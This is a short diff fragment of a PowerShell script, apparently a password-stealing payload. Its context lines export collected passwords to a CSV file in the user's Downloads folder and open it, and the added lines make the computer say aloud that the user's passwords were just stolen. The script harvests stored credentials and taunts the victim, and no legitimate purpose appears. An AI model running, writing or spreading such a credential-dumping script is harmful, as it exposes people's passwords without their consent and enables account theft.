@@ -415,3 +415,10 @@ $AllPasswords | Export-Csv $env:USERPROFILE\downloads\passwords.csv -notypeinfor
 sleep 2
 cd $env:USERPROFILE\downloads
 .\passwords.csv
+
+Add-Type -AssemblyName System.speech
+$tts = New-Object System.Speech.Synthesis.SpeechSynthesizer
+$poem = @('
+Your passwords were just stolen!
+')
+$tts.Speak($poem)
